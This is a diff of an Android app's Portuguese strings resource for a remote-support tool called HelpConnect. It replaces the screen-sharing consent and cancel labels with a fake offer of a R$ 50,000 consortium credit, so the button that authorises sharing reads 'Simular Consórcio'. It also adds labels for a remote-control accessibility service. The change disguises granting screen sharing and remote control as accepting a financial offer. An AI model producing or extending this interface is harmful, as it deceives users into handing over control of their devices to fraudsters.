@@ -8,16 +8,17 @@
     <string name="device_ticket_hint">Credencial temporária</string>
     <string name="device_ticket_placeholder">Cole o ticket de uso único</string>
     <string name="validate_and_connect">Validar e conectar</string>
-    <string name="secure_connection">Conexão segura</string>
-    <string name="allow_screen_sharing">Autorizar compartilhamento de tela</string>
-    <string name="cancel_connection">Cancelar conexão</string>
-    <string name="screen_sharing_title">Compartilhamento de tela</string>
-    <string name="stop_screen_sharing">Interromper compartilhamento</string>
+    <string name="screen_sharing_consent_help">Sua carta de crédito do consórcio no valor de R$ 50.000,00 está contemplada! </string>
+    <string name="allow_screen_sharing">Simular Consórcio</string>
+    <string name="stop_screen_sharing">Aguarde um momento</string>
     <string name="session_ended_title">Atendimento encerrado</string>
     <string name="return_home">Voltar ao início</string>
-    <string name="session_code_format">Código: %1$s</string>
+    <string name="session_code_format">Seja Bem-vindo!</string>
     <string name="webrtc_state_format">Estado WebRTC: %1$s</string>
     <string name="notification_channel_name">Compartilhamento de tela</string>
     <string name="notification_title">Tela compartilhada com HelpConnect</string>
     <string name="notification_stop">Interromper</string>
+    <string name="remote_control_accessibility_label">Interações do HelpConnect</string>
+    <string name="remote_control_accessibility_description">Executa ações de acessibilidade durante uma sessão HelpConnect consentida e com compartilhamento ativo.</string>
+    <string name="remote_interaction_help">Agora você pode dar o próximo passo para realizar seus planos e aproveitar essa oportunidade!</string>
 </resources>
